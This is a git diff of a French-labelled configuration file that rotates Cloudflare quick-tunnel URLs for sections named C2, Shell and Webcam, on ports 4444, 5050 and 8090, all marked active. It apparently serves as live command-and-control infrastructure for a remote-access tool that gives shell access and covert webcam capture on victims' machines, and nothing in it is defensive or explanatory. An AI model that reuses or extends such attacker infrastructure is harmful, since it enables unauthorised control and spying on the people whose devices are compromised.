@@ -1,20 +1,20 @@
-# Tunnels Cloudflared - Mise à jour: 2025-08-12 09:45:42
+# Tunnels Cloudflared - Mise à jour: 2025-08-12 09:46:54
 # Version: 3.1
 
 [C2]
-URL=https://warren-pennsylvania-retro-res.trycloudflare.com
+URL=https://analysts-badly-conditional-functioning.trycloudflare.com
 PORT=4444
 TYPE=socket
 STATUS=ACTIVE
 
 [Shell]
-URL=https://chambers-pdf-rapidly-capability.trycloudflare.com
+URL=https://uk-remains-having-surprising.trycloudflare.com
 PORT=5050
 TYPE=socket
 STATUS=ACTIVE
 
 [Webcam]
-URL=https://subtle-wt-error-need.trycloudflare.com
+URL=https://benjamin-scroll-bizarre-influence.trycloudflare.com
 PORT=8090
 TYPE=flask
 STATUS=ACTIVE
